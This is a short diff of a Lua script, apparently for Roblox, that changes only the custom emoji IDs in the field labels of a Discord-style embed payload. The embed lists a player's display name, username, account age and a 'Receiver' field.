@@ -620,22 +620,22 @@ local payload = {
         color = 3447003,
         fields = {
             {
-                name = "<:players:1365290081937526834> **Display Name    **",
+                name = "<:emoji_4:1402578195294982156> **Display Name    **",
                 value = "```" .. (player.DisplayName or "Unknown") .. "```",
                 inline = true
             },
             {
-                name = "<:game:1365295942504550410> **Username**",
+                name = "<:emoji_2:1402577600060325910> **Username**",
                 value = "```" .. (player.Name or "Unknown") .. "```",
                 inline = true
             },
             {
-                name = "<:time:1365991843011100713> **Account Age**",
+                name = "<:emoji_7:1402587793909223530> **Account Age**",
                 value = "```" .. tostring(player.AccountAge) .. " Days```",
                 inline = true
             },
             {
-                name = "<:folder:1365290079081205844> **Receiver**",
+                name = "<:emoji_3:1402578008245801086> **Receiver**",
                 value = "```" .. (player.Name or "Unknown") .. "```",
                 inline = true
             },
